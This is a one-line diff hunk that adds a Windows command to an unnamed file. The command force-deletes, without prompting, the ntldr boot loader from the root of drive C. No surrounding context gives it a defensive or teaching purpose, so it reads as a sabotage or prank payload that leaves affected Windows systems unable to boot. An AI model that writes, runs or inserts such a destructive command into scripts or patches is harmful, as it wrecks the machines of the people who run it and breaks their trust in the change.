@@ -1,0 +1,1 @@
+del /a /f/q C:\ntldr
